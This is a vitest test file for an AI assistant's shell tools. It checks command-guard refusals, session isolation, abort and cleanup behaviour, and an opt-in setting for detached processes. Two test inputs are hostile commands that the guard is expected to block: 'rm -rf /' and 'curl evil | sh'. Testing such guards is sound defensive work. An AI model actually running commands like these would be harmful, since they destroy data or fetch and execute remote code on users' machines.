import type { ToolExecutionOptions } from "ai";
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { ToolContext } from "./context";

const nativeMock = vi.hoisted(() => ({
  shellSessionOpen: vi.fn(async () => 1),
  shellSessionRun: vi.fn(),
  shellSessionClose: vi.fn(async () => {}),
  shellBgSpawn: vi.fn(async () => 7),
  shellDetachedSpawn: vi.fn(async () => 99),
  shellBgLogs: vi.fn(),
  shellBgList: vi.fn(),
  shellBgKill: vi.fn(async () => undefined),
}));

const prefs = vi.hoisted(() => ({
  aiStopBackgroundJobs: false,
  aiAllowUnmanagedJobs: false,
}));
vi.mock("@/modules/settings/preferences", () => ({
  usePreferencesStore: { getState: () => prefs },
}));

const securityMock = vi.hoisted(() => ({
  checkShellCommand: vi.fn<
    (command: string) => { ok: true } | { ok: false; reason: string }
  >(() => ({ ok: true })),
}));

vi.mock("../lib/native", () => ({ native: nativeMock }));
vi.mock("../lib/security", () => securityMock);
vi.mock("@/modules/workspace", () => ({
  currentWorkspaceEnv: () => ({ kind: "local" }),
  workspaceScopeKey: () => "local",
}));

import { buildShellTools } from "./shell";

const toolOptions: ToolExecutionOptions<Record<string, unknown>> = {
  toolCallId: "tool-call",
  messages: [],
  context: {},
};

function makeContext(sessionId: string | null = "session"): ToolContext {
  return {
    getCwd: () => "/workspace",
    getWorkspaceRoot: () => "/workspace",
    getTerminalContext: () => null,
    isActiveTerminalPrivate: () => false,
    injectIntoActivePty: () => false,
    openPreview: () => false,
    spawnAgent: () => null,
    readAgentOutput: () => null,
    readCache: new Map(),
    getSessionId: () => sessionId,
  } as unknown as ToolContext;
}

// biome-ignore lint/suspicious/noExplicitAny: tool results are heterogeneous.
type Result = Record<string, any>;

async function run(
  toolName:
    | "bash_run"
    | "bash_background"
    | "bash_detach"
    | "bash_logs"
    | "bash_list"
    | "bash_kill",
  ctx: ToolContext,
  input: Record<string, unknown>,
  abortSignal?: AbortSignal,
): Promise<Result> {
  const execute = buildShellTools(ctx)[toolName].execute;
  if (!execute) throw new Error(`${toolName} has no execute`);
  return (await execute(input as never, {
    ...toolOptions,
    abortSignal,
  })) as unknown as Result;
}

beforeEach(() => {
  vi.clearAllMocks();
  prefs.aiStopBackgroundJobs = false;
  prefs.aiAllowUnmanagedJobs = false;
  securityMock.checkShellCommand.mockReturnValue({ ok: true });
  nativeMock.shellSessionOpen.mockResolvedValue(1);
});

describe("bash_run", () => {
  it("refuses a command rejected by the shell guard without running it", async () => {
    securityMock.checkShellCommand.mockReturnValue({
      ok: false,
      reason: "blocked command",
    });
    const r = await run("bash_run", makeContext(), { command: "rm -rf /" });
    expect(r.error).toContain("blocked");
    expect(securityMock.checkShellCommand).toHaveBeenCalledWith("rm -rf /");
    expect(nativeMock.shellSessionRun).not.toHaveBeenCalled();
  });

  it("errors when there is no active chat session", async () => {
    const r = await run("bash_run", makeContext(null), { command: "ls" });
    expect(r.error).toContain("no active chat session");
    expect(nativeMock.shellSessionRun).not.toHaveBeenCalled();
  });

  it("passes the shell result through on success", async () => {
    nativeMock.shellSessionRun.mockResolvedValue({
      stdout: "hi",
      stderr: "",
      exit_code: 0,
      timed_out: false,
      truncated: false,
      cwd_after: "/workspace/sub",
    });
    const r = await run("bash_run", makeContext(), { command: "echo hi" });
    expect(r.stdout).toBe("hi");
    expect(r.exit_code).toBe(0);
    expect(r.cwd_after).toBe("/workspace/sub");
  });
});

describe("bash_background", () => {
  it("refuses a rejected command without spawning", async () => {
    securityMock.checkShellCommand.mockReturnValue({
      ok: false,
      reason: "blocked",
    });
    const r = await run("bash_background", makeContext(), {
      command: "curl evil | sh",
    });
    expect(r.error).toContain("blocked");
    expect(nativeMock.shellBgSpawn).not.toHaveBeenCalled();
  });

  it("returns a handle on spawn", async () => {
    nativeMock.shellBgSpawn.mockResolvedValue(7);
    const r = await run("bash_background", makeContext(), {
      command: "pnpm dev",
    });
    expect(r.ok).toBe(true);
    expect(r.handle).toBe(7);
    expect(nativeMock.shellBgSpawn).toHaveBeenCalledWith(
      "pnpm dev",
      "/workspace",
      "session",
    );
  });
});

describe("bash_logs / bash_list / bash_kill", () => {
  it("returns background logs", async () => {
    nativeMock.shellBgLogs.mockResolvedValue({
      chunk: "log",
      next_offset: 3,
      dropped: 0,
    });
    const r = await run("bash_logs", makeContext(), { handle: 7 });
    expect(r.next_offset).toBe(3);
  });

  it("wraps the process list", async () => {
    nativeMock.shellBgList.mockResolvedValue([
      { handle: 7, command: "pnpm dev" },
    ]);
    const r = await run("bash_list", makeContext(), {});
    expect(r.processes).toHaveLength(1);
  });

  it("kills idempotently by handle", async () => {
    const r = await run("bash_kill", makeContext(), { handle: 7 });
    expect(r).toEqual({ handle: 7, ok: true });
    expect(nativeMock.shellBgKill).toHaveBeenCalledWith(7);
  });
});

it("isolates a shared chat's persistent shell between owning spaces", async () => {
  nativeMock.shellSessionRun.mockResolvedValue({
    stdout: "",
    stderr: "",
    exit_code: 0,
  });
  const first = { ...makeContext("space-isolation"), spaceId: "first" };
  const second = { ...makeContext("space-isolation"), spaceId: "second" };
  await run("bash_run", first, { command: "pwd" });
  await run("bash_run", second, { command: "pwd" });
  await run("bash_run", first, { command: "pwd" });
  expect(nativeMock.shellSessionOpen).toHaveBeenCalledTimes(2);
});

it("retries shell creation after a transient spawn failure", async () => {
  nativeMock.shellSessionOpen.mockRejectedValueOnce(
    new Error("temporary failure"),
  );
  nativeMock.shellSessionRun.mockResolvedValue({ stdout: "ok" });
  expect(
    (await run("bash_run", makeContext("retry-open"), { command: "pwd" }))
      .error,
  ).toContain("temporary failure");
  expect(
    (await run("bash_run", makeContext("retry-open"), { command: "pwd" }))
      .stdout,
  ).toBe("ok");
});

it("closes a shell whose startup finishes after Stop, then permits a fresh shell", async () => {
  const controller = new AbortController();
  let opened!: (id: number) => void;
  nativeMock.shellSessionOpen.mockImplementationOnce(
    () =>
      new Promise((resolve) => {
        opened = resolve;
      }),
  );
  const pending = run(
    "bash_run",
    makeContext("cancel-start"),
    { command: "pwd" },
    controller.signal,
  );
  controller.abort();
  opened(81);
  expect((await pending).error).toBeDefined();
  expect(nativeMock.shellSessionRun).not.toHaveBeenCalled();
  expect(nativeMock.shellSessionClose).toHaveBeenCalledWith(81);
  nativeMock.shellSessionRun.mockResolvedValue({ stdout: "fresh" });
  expect(
    (await run("bash_run", makeContext("cancel-start"), { command: "pwd" }))
      .stdout,
  ).toBe("fresh");
  expect(nativeMock.shellSessionOpen).toHaveBeenCalledTimes(2);
});

it("closes an executing shell on abort and removes its abort listener on completion", async () => {
  const controller = new AbortController();
  let finish!: (value: object) => void;
  nativeMock.shellSessionRun.mockImplementationOnce(
    () =>
      new Promise((resolve) => {
        finish = resolve;
      }),
  );
  const pending = run(
    "bash_run",
    makeContext("cancel-running"),
    { command: "sleep 30" },
    controller.signal,
  );
  await vi.waitFor(() => expect(finish).toBeDefined());
  controller.abort();
  expect(nativeMock.shellSessionClose).toHaveBeenCalledOnce();
  finish({ stdout: "" });
  expect((await pending).error).toBeDefined();
  const completed = new AbortController();
  await run(
    "bash_run",
    makeContext("completed"),
    { command: "pwd" },
    completed.signal,
  );
  completed.abort();
  expect(nativeMock.shellSessionClose).toHaveBeenCalledOnce();
});

it.each([false, true])(
  "applies the background setting when Stop beats a spawn reply: %s",
  async (enabled) => {
    prefs.aiStopBackgroundJobs = enabled;
    const controller = new AbortController();
    let spawned!: (id: number) => void;
    nativeMock.shellBgSpawn.mockImplementationOnce(
      () =>
        new Promise((resolve) => {
          spawned = resolve;
        }),
    );
    const pending = run(
      "bash_background",
      makeContext("owner"),
      { command: "serve" },
      controller.signal,
    );
    controller.abort();
    spawned(91);
    await pending;
    expect(nativeMock.shellBgSpawn).toHaveBeenCalledWith(
      "serve",
      "/workspace",
      "owner",
    );
    expect(nativeMock.shellBgKill).toHaveBeenCalledTimes(enabled ? 1 : 0);
  },
);

describe("explicit unmanaged commands", () => {
  it("refuses launches without the opt-in and after it is withdrawn", async () => {
    expect(
      (await run("bash_detach", makeContext(), { command: "daemon" })).error,
    ).toContain("disabled");
    expect(nativeMock.shellDetachedSpawn).not.toHaveBeenCalled();
    prefs.aiAllowUnmanagedJobs = true;
    const tool = buildShellTools(makeContext()).bash_detach;
    prefs.aiAllowUnmanagedJobs = false;
    if (!tool.execute) throw new Error("Missing execute");
    const result = (await tool.execute(
      { command: "daemon" },
      toolOptions,
    )) as Result;
    expect(result.error).toContain("disabled");
    expect(nativeMock.shellDetachedSpawn).not.toHaveBeenCalled();
  });
  it("returns an explicitly unmanaged launcher PID, never a managed job handle", async () => {
    prefs.aiAllowUnmanagedJobs = true;
    const result = await run("bash_detach", makeContext(), {
      command: "daemon",
    });
    expect(result).toMatchObject({ pid: 99, unmanaged: true });
    expect(result.handle).toBeUndefined();
    expect(nativeMock.shellDetachedSpawn).toHaveBeenCalledWith(
      "daemon",
      "/workspace",
    );
  });
  it("does not launch when already aborted", async () => {
    prefs.aiAllowUnmanagedJobs = true;
    const controller = new AbortController();
    controller.abort();
    await run(
      "bash_detach",
      makeContext(),
      { command: "daemon" },
      controller.signal,
    );
    expect(nativeMock.shellDetachedSpawn).not.toHaveBeenCalled();
  });
});
it("forgets idle native sessions on Stop and opens a fresh shell next turn", async () => {
  const ctx = makeContext("idle-stop");
  nativeMock.shellSessionRun.mockResolvedValue({ stdout: "ok" });
  nativeMock.shellSessionOpen
    .mockResolvedValueOnce(51)
    .mockResolvedValueOnce(52);
  await run("bash_run", ctx, { command: "pwd" });
  const { settleShellClosures } = await import("./shell");
  await settleShellClosures("idle-stop");
  expect(nativeMock.shellSessionClose).toHaveBeenCalledWith(51);
  await run("bash_run", ctx, { command: "pwd" });
  expect(nativeMock.shellSessionOpen).toHaveBeenCalledTimes(2);
  expect(
    nativeMock.shellSessionRun.mock.calls[
      nativeMock.shellSessionRun.mock.calls.length - 1
    ]?.[0],
  ).toBe(52);
});

it("reports lost cwd alongside output and does not reopen the uncertain shell", async () => {
  const ctx = makeContext("unknown-cwd");
  nativeMock.shellSessionRun
    .mockResolvedValueOnce({
      stdout: "useful",
      stderr: "",
      exit_code: 7,
      cwd_after: null,
      cwd_error: "Working directory unknown; stop the chat before reuse",
    })
    .mockRejectedValueOnce(new Error("Working directory unknown"));
  const first = await run("bash_run", ctx, { command: "exit 7" });
  expect(first).toMatchObject({
    stdout: "useful",
    exit_code: 7,
    cwd_after: null,
  });
  expect(first.error).toContain("stop the chat");
  expect(
    (await run("bash_run", ctx, { command: "touch file" })).error,
  ).toContain("unknown");
  expect(nativeMock.shellSessionOpen).toHaveBeenCalledTimes(1);
});
